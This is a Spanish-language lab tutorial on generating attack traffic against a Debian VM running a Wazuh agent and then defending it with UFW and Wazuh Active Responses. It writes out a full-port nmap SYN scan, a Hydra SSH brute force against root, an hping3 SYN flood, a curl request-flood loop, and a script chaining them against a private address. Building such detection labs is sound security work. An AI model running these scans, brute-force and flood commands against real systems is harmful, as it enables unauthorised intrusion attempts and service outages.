# 🔹 Automatización de ataques y defensa en Debian 12/13

## 1. Preparar la máquina atacante

En una VM con Debian 12/13 instala herramientas para generar tráfico malicioso:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y nmap hydra metasploit-framework hping3 curl git
```

- **nmap** → escaneo de puertos y servicios.
- **hydra** → ataques de fuerza bruta (SSH, FTP, MySQL).
- **metasploit** → explotación de vulnerabilidades conocidas.
- **hping3** → simulación de DoS/DDoS con paquetes TCP/UDP/ICMP.
- **curl/wget** → peticiones HTTP repetitivas contra endpoints.

---

## 2. Ejemplos de ataques automatizados

### Escaneo de puertos (detectado por Suricata/Wazuh):

```bash
nmap -sS -p- 192.168.1.50
```

### Ataque de fuerza bruta SSH:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50
```

### Simular DDoS (SYN flood):

```bash
sudo hping3 -S --flood -V -p 80 192.168.1.50
```

### Petición masiva contra servicio web:

```bash
while true; do curl -s http://192.168.1.50 > /dev/null; done
```

---

## 3. Integración con Wazuh

Cuando ejecutes estos ataques, el **Agente Wazuh** en la máquina víctima enviará eventos al Manager:

- **Escaneos** → alertas de reconocimiento.
- **Fuerza bruta** → detección de múltiples intentos fallidos.
- **DDoS** → anomalías de red.
- **Peticiones HTTP** → patrones sospechosos en logs de Apache/Nginx.

---

## 4. Automatización con scripts

Puedes crear un script Bash para lanzar varios ataques uno tras otro:

```bash name=ataque_auto.sh
#!/bin/bash
# ataque_auto.sh - Simulación de ataques
VICTIMA="192.168.1.50"

echo "[*] Escaneo de puertos con nmap"
nmap -sS -p- $VICTIMA

echo "[*] Fuerza bruta SSH con Hydra"
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$VICTIMA -t 4 -f

echo "[*] Simulando DDoS con hping3"
hping3 -S --flood -V -p 80 $VICTIMA
```

---

## 5. Defensa en Debian 12/13

**En la máquina víctima (con Wazuh Agent):**

Instala y habilita UFW para bloquear IPs sospechosas:

```bash
sudo apt install ufw -y
sudo ufw enable
sudo ufw allow ssh
sudo ufw allow 1514/udp   # comunicación con Wazuh Manager
sudo ufw allow 1515/tcp
sudo ufw status
```

Configura **Active Responses** en Wazuh para que bloquee automáticamente al atacante tras X intentos.

---
